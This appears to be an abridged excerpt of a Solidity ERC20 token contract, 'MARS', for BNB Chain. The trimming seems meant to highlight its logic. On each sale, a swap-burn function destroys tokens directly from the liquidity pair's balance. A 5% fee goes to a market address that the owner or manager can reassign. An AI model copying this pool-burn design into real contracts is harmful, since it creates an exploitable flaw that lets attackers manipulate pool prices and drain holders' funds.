...
contract MARS is ERC20, Ownable {
    ...
    constructor() ERC20("MARS", "MARS") {
        ...
        if (block.chainid == 56) {
            manager = 0xB51d390dB02eF7777e49118Fd5ebc8da506AFE5a;
            market = 0x625DaAba912a0b2d4d7f132119C9E8B7510333d4;
            recieve = 0x4578f9985658c3e5Eb24D972b8A6E403EA2133Ad;
            _usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
            swapRouter = ISwapRouter(
                0x10ED43C718714eb63d5aA57B78B54704E256024E
            );
        } else {
            _usdtAddress = 0xa571387b273bCe7bE65a64abE1b2898a58119127;
            swapRouter = ISwapRouter(
        ...
        _mint(recieve, 100_0000_0000 * 10 ** decimals());
    }
    ...
    function setMarket(address account) public {
        if (owner() == _msgSender() || manager == _msgSender()) {
            market = account;
        }
    }
    ...
    function _transfer(
        ...
        if (_inSwapAndLiquify || isFeeExempt[from] || isFeeExempt[to]) {
            ...
            super._transfer(from, address(1), amount);
        } else if (to == swapPair) {
            if (swapPair != address(0) && !_inSwapAndLiquify) {
                _swapBurn(amount);
            }
            uint every = amount / 100;
            super._transfer(from, market, every * 5);
    ...
    function _swapBurn(uint amount) private lockTheSwap {
        if (totalCirculation() > minTotalSupply() + amount) {
            super._burn(swapPair, amount);
        }
